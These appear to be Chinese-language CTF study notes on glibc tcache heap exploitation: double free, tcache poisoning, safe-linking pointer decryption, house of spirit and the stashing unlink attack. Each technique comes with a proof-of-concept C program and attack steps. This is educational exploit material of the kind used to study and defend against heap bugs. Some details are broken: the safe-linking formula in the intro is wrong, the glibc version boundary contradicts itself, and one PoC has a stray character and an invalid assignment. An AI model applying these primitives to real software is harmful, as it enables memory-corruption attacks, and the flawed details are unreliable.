# Tcache Attack

## What's Tcache？

* Glibc2.26后的缓冲机制。

* 遵循LIFO(后进先出)原则，和fastbin、stack一样。、

* 程序每当从fastbin/small bin中取出一个堆块，会尝试把该bin中剩余的堆块拿出来去填充tcache。

* 同一个大小chunk的chunk最多存放7个

* **Tcache Size** 。

  x64: 0x18 --- 0x408 

  x86: 0xC ---  0x200

* **Glibc2.35**以后，出现地址加密机制，fd存放下一个chunk地址异或后的值

  算法：(当前地址 >> 12)  xor 当前地址

  这里的key存放在Tcache链中末尾chunk的fd中。
  
  

## Tcache Double Free

### 利用方式总结

1. 破坏掉被 free 的堆块中的 key，绕过检查（常用）
2. 改变被 free 的堆块的大小，遍历时进入另一 idx 的 entries
3. **House of botcake**（常用）

### Tcache dup

#### 更改key值
适用glibc 2.29及以上版本。
glibc 2.29增加了新的检测机制

```C
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  uintptr_t key;
} tcache_entry;
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
    /* Check to see if it's already in the tcache.  */
    tcache_entry *e = (tcache_entry *) chunk2mem (p);

    /* This test succeeds on double free.  However, we don't 100%
       trust it (it also matches random payload data at a 1 in
       2^<size_t> chance), so verify it's not an unlikely
       coincidence before aborting.  */
    if (__glibc_unlikely (e->key == tcache_key))
      {
        tcache_entry *tmp;
        size_t cnt = 0;
        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
        for (tmp = tcache->entries[tc_idx];
         tmp;
         tmp = REVEAL_PTR (tmp->next), ++cnt)
          {
        if (cnt >= mp_.tcache_count)
          malloc_printerr ("free(): too many chunks detected in tcache");
        if (__glibc_unlikely (!aligned_OK (tmp)))
          malloc_printerr ("free(): unaligned chunk detected in tcache 2");
        if (tmp == e)
          malloc_printerr ("free(): double free detected in tcache 2");
        /* If we get here, it was a coincidence.  We've wasted a
           few cycles, but don't abort.  */
          }
      }
	... ...
  }
```
tcache bin结构
```
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |     		previous size  									|
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |     		Size                     |A|M|P|				|
      	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |           fd 												|
       	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |           key                     						|
		+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

只需要更改key的值即可。

程序演示：
```c
#include <stdio.h>
#include <stdint.h>

int main()
{
	int64_t *ptr=malloc(0x40);
    free(ptr);
    ptr[1]=12345;
	free(ptr);
        
    printf("%p\n",malloc(0x40));
    printf("%p\n",malloc(0x40));
    
    return 0;
}
```

## Tcache-poisoning

#### glibc 2.31及版本以下利用

直接伪造next ，注意伪造地址的对齐。

程序演示：
```C
#include <stdio.h>s
#include <stdint.h>

int main()
{
	int64_t *p1=malloc(0x40);
    int64_t *p2=malloc(0x40);
    int64_t stack_addr="deadbeef";
    free(p1);
    free(p2);
    
    p2[0]=&stack_addr;
    printf("malloc chunk = %p\n",malloc(0x40));
    printf("fake chunk = %p\n",malloc(0x40));
    return 0;
}
```

#### glibc2.31以上版本利用

需要伪造加密后的next，注意伪造地址的对齐。

算法：(当前地址 >> 12)  xor next的地址

程序演示：

```C++
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
	size_t stack_var[0x10];
	size_t *target = NULL;

	// choose a properly aligned target address
	for(int i=0; i<0x10; i++) {
		if(((long)&stack_var[i] & 0xf) == 0) {
			target = &stack_var[i];
			break;
		}
	}
	assert(target != NULL);
	printf("The address we want malloc() to return is %p.\n", target);
	intptr_t *a = malloc(128);
	intptr_t *b = malloc(128);
	free(a);
	free(b);
	b[0] = (intptr_t)((long)target ^ (long)b >> 12);
	printf("1st malloc(128): %p\n", malloc(128));
	intptr_t *c = malloc(128);
	printf("2nd malloc(128): %p\n", c);
	return 0;
}
```

#### decrypt_safe_linking

```C
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

long decrypt(long cipher)
{
	puts("The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,");
	puts("because of the 12bit sliding.");
	puts("And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)");
	long key = 0;
	long plain;

	for(int i=1; i<6; i++) {
		int bits = 64-12*i;
		if(bits < 0) bits = 0;
		plain = ((cipher ^ key) >> bits) << bits;
		key = plain >> 12;
		printf("round %d:\n", i);
		printf("key:    %#016lx\n", key);
		printf("plain:  %#016lx\n", plain);
		printf("cipher: %#016lx\n\n", cipher);
	}
	return plain;
}

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	// step 1: allocate chunks
	long *a = malloc(0x20);
	long *b = malloc(0x20);
	printf("First, we create chunk a @ %p and chunk b @ %p\n", a, b);
	malloc(0x10);
	puts("And then create a padding chunk to prevent consolidation.");


	// step 2: free chunks
	puts("Now free chunk a and then free chunk b.");
	free(a);
	free(b);
	printf("Now the freelist is: [%p -> %p]\n", b, a);
	printf("Due to safe-linking, the value actually stored at b[0] is: %#lx\n", b[0]);

	// step 3: recover the values
	puts("Now decrypt the poisoned value");
	long plaintext = decrypt(b[0]);

	printf("value: %p\n", a);
	printf("recovered value: %#lx\n", plaintext);
	assert(plaintext == (long)a);
}
```

## Tcache house of spirit

POC

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	unsigned long long *a; //pointer that will be overwritten
	unsigned long long fake_chunks[10]; //fake chunk region
   
    malloc(1);
	fake_chunks[1] = 0x40; // this is the size
	a = &fake_chunks[2];
	free(a);
	void *b = malloc(0x30);
	printf("malloc(0x30): %p\n", b);
	assert((long)b == (long)&fake_chunks[2]);
}
```

### Tcache stashing unlink attack

POC

```C
  1 //gcc -g -no-pie hollk.c -o hollk
  2 //patchelf --set-rpath 路径/2.27-3ubuntu1_amd64/ hollk
  3 //patchelf --set-interpreter 路径/2.27-3ubuntu1_amd64/ld-linux-x86-64.so.2 hollk
  4 #include <stdio.h>
  5 #include <stdlib.h>
  6 #include <assert.h>
  7 
  8 int main(){
  9     unsigned long stack_var[0x10] = {0};
 10     unsigned long *chunk_lis[0x10] = {0};
 11     unsigned long *target;
 12 
 13     setbuf(stdout, NULL);
 14     
 15     printf("stack_var addr is:%p\n",&stack_var[0]);
 16     printf("chunk_lis addr is:%p\n",&chunk_lis[0]);
 17     printf("target addr is:%p\n",(void*)target);
 18 
 19     stack_var[3] = (unsigned long)(&stack_var[2]);
 20 
 21     for(int i = 0;i < 9;i++){
 22         chunk_lis[i] = (unsigned long*)malloc(0x90);
 23     }
 24 
 25     for(int i = 3;i < 9;i++){
 26         free(chunk_lis[i]);
 27     }
 28     
 29     free(chunk_lis[1]);
 30     free(chunk_lis[0]);
 31     free(chunk_lis[2]);
 32     
 33     malloc(0xa0);
 34     malloc(0x90);
 35     malloc(0x90);
 36     
 37     chunk_lis[2][1] = (unsigned long)stack_var;
 38     calloc(1,0x90);
 39 
 40     target = malloc(0x90);
 41 
 42     printf("target now: %p\n",(void*)target);
 43 
 44     assert(target == &stack_var[2]);
 45     return 0;
 46 }
```

知识点：

* calloc分配内存
  * calloc不会从fastbins和tcache bin中分配内存（即使请求大小匹配），因为fastbins的chunk可能未合并，无法保证连续空间。
  * 分配时优先从smallbins/unsortedbins或top chunk切割。
  * calloc从small bin 中拿出一个空闲chunk后，会将其余chunk放入tcache bin 中（直到填满），并且只会检测对第一个 chunk进行了完整性检查，后面的chunk的检查缺失，就造成了fake chunk。

攻击步骤：

1. malloc(0x90)大小的 9个chunk
2. free 7 个chunk 填满 tcache bin
3. free 2 个chunk（chunk0、chunk2） 放入unsorted bin
4. malloc(0xa0)大小的chunk，由于unsorted bin存取机制的原因，unsorted bin中如果没有符合chunk size的空闲块（chunk0、chunk2 size小于0xb0），那么unsorted bin中的空闲块会按照size分配到在small bin或large bin的链表中。
5. chunk0、chunk2被放入 small bin中
6. 修改 chunk2 中的bk指向目标地址fake_chunk
7. 使用calloc分配地址，触发calloc的机制，分配chunk0，检测chunk2，并将small bin中的chunk放入tcache中，直到填满。
8. malloc(0x90) ,得到fake chunk。
